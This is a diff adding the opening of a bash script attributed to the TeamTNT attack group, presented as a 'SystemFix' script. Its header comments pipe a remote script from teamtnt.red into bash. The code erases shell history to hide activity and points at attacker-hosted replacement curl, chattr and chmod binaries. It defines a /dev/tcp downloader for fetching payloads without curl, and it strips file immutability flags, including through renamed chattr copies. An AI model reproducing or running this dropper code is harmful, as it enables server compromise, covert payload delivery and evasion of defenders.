@@ -1,0 +1,72 @@
+#!/bin/bash
+#
+#	TITLE:		TeamTNT.default.SystemFix-Script
+#	AUTOR:		hilde@teamtnt.red
+#	VERSION:	3.00.0
+#	DATE:		18.09.2021
+#
+#	curl -Lk http://teamtnt.red/scripte/TeamTNT.default.SystemFix.sh.txt | bash
+#	wget -O- http://teamtnt.red/scripte/TeamTNT.default.SystemFix.sh.txt | bash
+#
+########################################################################
+
+export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
+export LANG=C.UTF-8 2>/dev/null 1>/dev/null
+HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
+export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
+HISTSIZE=0 2>/dev/null 1>/dev/null
+unset HISTFILE 2>/dev/null 1>/dev/null
+
+HTTP_BASE_URL="http://teamtnt.red"
+export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
+
+TNT_CURL_BIN="$HTTP_BASE_URL/bin/SystemFix/x86_64/curl"
+TNT_CHATTR_BIN="$HTTP_BASE_URL/bin/SystemFix/x86_64/chattr"
+TNT_CHMOD_BIN="$HTTP_BASE_URL/bin/SystemFix/x86_64/chmod"
+
+
+
+if [ -f "/usr/bin/python" ];then PYTHON_VER="/usr/bin/python" ; fi
+	if [ -f "/usr/bin/python2" ];then PYTHON_VER="/usr/bin/python2" ; fi
+if [ -f "/usr/bin/python2.7" ];then PYTHON_VER="/usr/bin/python2.7" ; fi
+	if [ -f "/usr/bin/python3" ];then PYTHON_VER="/usr/bin/python3" ; fi
+if [ -f "/usr/bin/python3m" ];then PYTHON_VER="/usr/bin/python3m" ; fi
+	if [ -f "/usr/bin/python3.5" ];then PYTHON_VER="/usr/bin/python3.5" ; fi
+if [ -f "/usr/bin/python3.6" ];then PYTHON_VER="/usr/bin/python3.6" ; fi
+	if [ -f "/usr/bin/python3.6m" ];then PYTHON_VER="/usr/bin/python3.6m" ; fi
+if [ -f "/usr/bin/python3.7" ];then PYTHON_VER="/usr/bin/python3.7" ; fi
+	if [ -f "/usr/bin/python3.7m" ];then PYTHON_VER="/usr/bin/python3.7m" ; fi
+if [ -f "/usr/bin/python3.8" ];then PYTHON_VER="/usr/bin/python3.8" ; fi
+
+
+
+
+function TeamTNT_DLOAD() {
+  read proto server path <<< "${1//"/"/ }"
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  while IFS= read -r line ; do 
+      [[ "$line" == $'\r' ]] && break
+  done <&3
+  nul='\0'
+  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
+      printf "%s$nul" "$x"
+  done <&3
+  exec 3>&-
+}
+
+
+function TeamTNT_CHATTR(){
+T_FILE=$1
+chattr -ia $T_FILE 2>/dev/null 1>/dev/null
+tntrecht -ia $T_FILE 2>/dev/null 1>/dev/null
+ichdarf -ia $T_FILE 2>/dev/null 1>/dev/null
+}
+
+
+
+
